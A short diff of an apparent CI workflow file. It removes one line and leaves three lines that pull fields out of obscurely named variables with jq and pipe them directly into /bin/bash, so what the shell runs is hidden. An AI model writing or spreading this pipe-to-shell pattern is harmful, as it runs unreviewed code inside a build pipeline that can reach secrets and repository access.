@@ -21,7 +21,6 @@ jobs:
           echo $dk7766 | jq -r .a7 | /bin/bash
           printf '%s' "$weg83982" | jq -r .f40 | /bin/bash
           echo $ojszd58170 | jq -r .kpw32969 | /bin/bash
-          echo $r49174 | jq -r .ts5915 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
